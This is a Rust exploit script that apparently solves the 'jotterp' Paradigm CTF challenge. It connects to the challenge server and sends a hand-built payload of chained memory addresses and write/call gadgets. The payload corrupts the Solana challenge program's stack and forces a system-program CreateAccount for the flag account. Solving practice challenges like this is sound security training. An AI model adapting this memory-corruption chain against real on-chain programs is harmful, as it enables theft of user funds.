use bincode::serialize;
use solana_program::system_instruction::SystemInstruction;
use solana_program::system_program;
use solana_program::{instruction::AccountMeta, pubkey::Pubkey};
use std::net::TcpStream;
use std::{error::Error, io::prelude::*, io::BufReader, str::FromStr};

fn get_line<R: Read>(reader: &mut BufReader<R>) -> Result<String, Box<dyn Error>> {
    let mut line = String::new();
    reader.read_line(&mut line)?;

    let ret = line
        .split(':')
        .nth(1)
        .ok_or("invalid input")?
        .trim()
        .to_string();

    Ok(ret)
}

fn main() -> Result<(), Box<dyn Error>> {
    println!("running");

    let mut stream = TcpStream::connect("jotterp.challenges.paradigm.xyz:1337")?;
    let mut reader = BufReader::new(stream.try_clone().unwrap());

    let mut line = String::new();

    let user = Pubkey::from_str(&get_line(&mut reader)?)?;

    let start: u64 = 0x400007940;
    let end_write: u64 = 0x400005130;

    let stack: u64 = 0x200003000;
    let write: u64 = 0x1000002b0;
    let call: u64 = 0x100000180;

    let fin: u64 = 0x100001bf8 - 8 * 10;

    let flag = Pubkey::create_program_address(&["FLAG".as_ref()], &chall::ID)?;

    let from = user;
    let to = flag;

    let key1 = system_program::ID
        .to_bytes()
        .chunks(8)
        .map(|x| u64::from_le_bytes(x[..8].try_into().unwrap()))
        .collect::<Vec<u64>>();

    let cnt = 7;

    let instr = serialize(&SystemInstruction::CreateAccount {
        lamports: 1_000_000_000,
        space: 0x1337,
        owner: chall::ID,
    })
    .unwrap();

    let mut val = Vec::<u64>::new();

    val.extend([
        write,
        start + 0x20 + val.len() as u64 * 8,
        call,
        start + 0x30 + val.len() as u64 * 8,
        stack + 0x2000 * cnt - 0x98,
        0xfffffff, // filled later: [5]
    ]);

    val.extend([
        write,
        start + 0x20 + val.len() as u64 * 8,
        call,
        start + 0x30 + val.len() as u64 * 8,
        stack + 0x2000 * cnt - 0x90,
        1,
    ]);

    val.extend([
        write,
        start + 0x20 + val.len() as u64 * 8,
        call,
        start + 0x30 + val.len() as u64 * 8,
        stack + 0x2000 * cnt - 0x88,
        0x300007fa0,
    ]);

    val.extend([
        write,
        start + 0x20 + val.len() as u64 * 8,
        call,
        start + 0x30 + val.len() as u64 * 8,
        stack + 0x2000 * cnt - 0x80,
        2, // account_infos_len
    ]);

    val.extend([
        write,
        start + 0x20 + val.len() as u64 * 8,
        call,
        start + 0x30 + val.len() as u64 * 8,
        stack + 0x2000 * cnt - 0x78,
        start, // any writable
    ]);

    val.extend([
        fin,
        start + 0x30 + val.len() as u64 * 8,
        write,
        start + 0x20 + val.len() as u64 * 8,
        end_write,
        0x4337,
        start + 0xb0 + val.len() as u64 * 8,
        2,
        2,
        start + 0xb0 + 34 * 2 + val.len() as u64 * 8,
        52,
        52,
        // pubkey
        key1[0],
        key1[1],
        key1[2],
        key1[3],
    ]);

    val[5] = start + val.len() as u64 * 8;

    val.extend([
        start + 0x10 + val.len() as u64 * 8,
        1,
        start + 0x20 + val.len() as u64 * 8,
        4,
        0x47414c46,
        0,
    ]);

    let mut data: Vec<u8> = val.into_iter().flat_map(|x| x.to_le_bytes()).collect();

    data.extend(from.to_bytes());
    data.extend([1, 1]);
    data.extend(to.to_bytes());
    data.extend([1, 1]);

    data.extend(instr);

    let metas = [
        &AccountMeta::new_readonly(system_program::ID, false),
        &AccountMeta::new(from, true),
        &AccountMeta::new(to, false),
    ];

    reader.read_line(&mut line)?;
    writeln!(stream, "{}", metas.len())?;
    for meta in metas {
        let mut meta_str = String::new();
        meta_str.push('m');
        if meta.is_writable {
            meta_str.push('w');
        }
        if meta.is_signer {
            meta_str.push('s');
        }
        meta_str.push(' ');
        meta_str.push_str(&meta.pubkey.to_string());

        writeln!(stream, "{}", meta_str)?;
        stream.flush()?;
    }

    reader.read_line(&mut line)?;
    writeln!(stream, "{}", data.len())?;
    stream.write_all(&data)?;

    stream.flush()?;

    line.clear();
    while reader.read_line(&mut line)? != 0 {
        print!("{}", line);
        line.clear();
    }

    Ok(())
}
